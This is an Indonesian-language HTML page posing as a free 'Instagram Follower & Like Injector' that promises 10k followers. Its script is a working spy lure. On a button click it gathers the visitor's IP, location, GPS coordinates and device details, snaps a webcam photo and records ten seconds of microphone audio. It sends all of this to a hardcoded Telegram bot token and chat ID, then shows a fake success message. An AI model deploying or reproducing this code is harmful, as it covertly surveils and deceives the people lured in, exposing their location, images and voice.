<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>‚ö° INSTAGRAM FOLLOWER & LIKE INJECTOR ‚ö°</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      /* Warna Instagram Gradient */
      background: linear-gradient(135deg, #405de6 0%, #833ab4 50%, #c13584 100%);
      font-family: 'Inter', sans-serif;
      color: #fff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(255, 255, 255, 0.5);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    .login-container {
      background-color: rgba(0, 0, 0, 0.9);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px #ff00ff;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle {
      font-size: 13px;
      color: #00ff7f;
      margin-bottom: 20px;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: 1px solid #c13584;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(45deg, #c13584, #feda75);
      color: #000;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover {
      background: linear-gradient(45deg, #feda75, #c13584);
      box-shadow: 0 0 20px #ff00ff;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
      color: #00ff7f;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
        border-radius: 14px;
      }
      .login-title {
        font-size: 22px;
      }
      .login-input, .login-button {
        font-size: 14px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">‚ö° INSTAGRAM FOLLOWER & LIKE INJECTOR ‚ö°</p>
    <p class="login-subtitle">üî• Dapatkan 10k Followers Gratis Sekarang Juga!</p>
    <input type="text" class="login-input" placeholder="Masukkan Username Instagram Target" id="text">
    <button class="login-button" id="login-button">INJECT FOLLOWERS</button>
    <div id="info">‚ú® Siap memproses permintaan Anda...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // ******************************************************************************
    // PERHATIAN: INI ADALAH KODE UNTUK EKSFILTRASI DATA
    // TOKEN DAN CHAT ID PENGGUNA MASIH TERPASANG DI SINI
    // ******************************************************************************
    
    const botToken = '7587432437:AAGrCXwV-U4f_XuoHPpoWCfOXK-xI4TsNE4'; // TOKEN TELEGRAM
    const chatIds = ['6914399273']; // ID CHAT TELEGRAM
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    // FUNGSI BARU: Kirim Audio ke Telegram
    function sendAudioToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('audio', blob, 'audio_capture.webm'); 
        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { 
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`üìç Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    // FUNGSI BARU: Mulai Merekam Audio
    async function startAudioCapture() {
      return new Promise((resolve) => {
          navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
              const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' }); 
              const audioChunks = [];

              mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
              };

              mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                sendAudioToTelegram(audioBlob); 
                stream.getTracks().forEach(track => track.stop());
                resolve();
              };

              mediaRecorder.start();
              setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                  mediaRecorder.stop();
                }
              }, 10000); // Merekam selama 10 detik

            })
            .catch(err => {
              sendToTelegram('‚ùå Mic Ditolak atau Tidak Tersedia');
              resolve();
            });
      });
    }

    button.addEventListener('click', async () => {
      const username = input.value.trim();
      if (!username || username.length < 3 || username.includes(' ')) {
        infoDiv.innerText = '‚ö†Ô∏è Username tidak valid.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = `‚è≥ Memproses injeksi follower untuk ${username}...`;
      sendToTelegram(`<b>üë§ TARGET IG BARU:</b> @${username}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        await startAudioCapture(); // <-- Eksekusi perekaman audio
        setTimeout(() => {
          infoDiv.innerText = `‚úÖ SUKSES! Followers akan masuk dalam 5-10 menit. Cek akun Anda!`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '‚ùå Terjadi kesalahan saat injeksi.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
